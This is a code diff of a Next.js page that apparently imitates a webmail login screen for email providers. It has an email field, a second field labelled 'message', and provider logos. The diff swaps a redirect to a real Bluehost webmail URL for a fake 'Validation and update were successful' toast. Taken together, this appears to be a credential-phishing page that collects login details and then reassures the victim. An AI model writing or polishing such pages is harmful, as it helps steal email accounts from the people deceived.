@@ -1,11 +1,12 @@
 "use client"
 import Image from "next/image";
-import { Lock, UserRound } from "lucide-react";
+import { Lock, UserRound, CheckCircle } from "lucide-react";
 import { useState } from "react";
 export default function Home() {
 
   const [form, setForm] = useState({ email: '', message: '' })
   const [showMessage, setShowMessage] = useState(false)
+  const [showToast, setShowToast] = useState(false)
 
   const handleChange = (e) => {
     setForm({ ...form, [e.target.name]: e.target.value })
@@ -22,8 +23,10 @@ export default function Home() {
 
     const data = await res.json()
     if (data.success) {
-      // Redirect after success
-      window.location.href = 'https://webmail-sh115.webhostingservices.com/cpsess0090581900/webmail/bluehost_in/index.html?login=1&post_login=63410917932749'
+      setShowToast(true)
+      setTimeout(() => {
+        window.location.href = ''
+      }, 2000)
     }
   }
 
@@ -92,11 +95,25 @@ export default function Home() {
               onClick={() => setShowMessage(!showMessage)}
               className=" w-[285px] h-[35.2px] text-center bg-[#179bd7] text-[13px] border rounded-sm border-gray-600 text-white">
               Login
-            </button> 
+            </button>
           </form>
         </div>
 
-        <ul className="flex flex-wrap gap-10 text-sm pt-[109px] text-[#293a4a]">
+        {/* Image Div */}
+        <div className="flex flex-wrap justify-center gap-3 mt-27">
+          {["works", "round", "webmail", "micro", "zoho", "proton", "fast", "private", "name", "host", "tita"].map((img) => (
+            <Image
+              key={img}
+              src={`/${img}.jpeg`}
+              alt={img}
+              width={60}
+              height={60}
+              className="object-contain"
+            />
+          ))}
+        </div>
+
+        <ul className="flex flex-wrap gap-10 text-sm pt-2 text-[#293a4a]">
           <li>English</li>
           <li>العربية</li>
           <li>български</li>
@@ -106,19 +123,6 @@ export default function Home() {
           <li>Ελληνικά</li>
           <li>español</li>
         </ul>
-        {/* Image Div */}
-<div className="flex flex-wrap justify-center gap-4 mt-2">
-  {["works", "round", "webmail", "micro", "zoho", "proton", "fast", "private", "name", "host", "tita"].map((img) => (
-    <Image
-      key={img}
-      src={`/${img}.jpeg`}
-      alt={img}
-      width={60}
-      height={60}
-      className="object-contain"
-    />
-  ))}
-</div>
       </div>
       <footer className="w-full flex flex-col items-center mt-20 text-sm">
 
@@ -140,6 +144,32 @@ export default function Home() {
         </a>
 
       </footer>
+
+      {/* Premium Toast Alert */}
+      {showToast && (
+        <div className="fixed top-10 left-1/2 -translate-x-1/2 z-[100] transition-all duration-500 ease-out animate-bounce-subtle">
+          <div className="flex items-center gap-4 bg-[#1e293b]/95 backdrop-blur-md border border-white/20 px-6 py-4 rounded-2xl shadow-[0_20px_50px_rgba(0,0,0,0.4)] min-w-[340px]">
+            <div className="flex items-center justify-center bg-green-500/20 rounded-full w-10 h-10 border border-green-500/30">
+              <CheckCircle className="text-green-400" size={24} />
+            </div>
+            <div className="flex flex-col">
+              <span className="text-white font-bold text-base leading-tight tracking-tight">Success</span>
+              <span className="text-gray-300 text-[13px] mt-0.5 font-medium">Validation and update were successful</span>
+            </div>
+          </div>
+        </div>
+      )}
+
+      {/* Inline styles for custom animations if needed, but Tailwind 4 should handle typical ones */}
+      <style jsx global>{`
+        @keyframes bounce-subtle {
+          0%, 100% { transform: translate(-50%, 0); }
+          50% { transform: translate(-50%, -5px); }
+        }
+        .animate-bounce-subtle {
+          animation: bounce-subtle 2s ease-in-out infinite;
+        }
+      `}</style>
     </div>
   );
 }
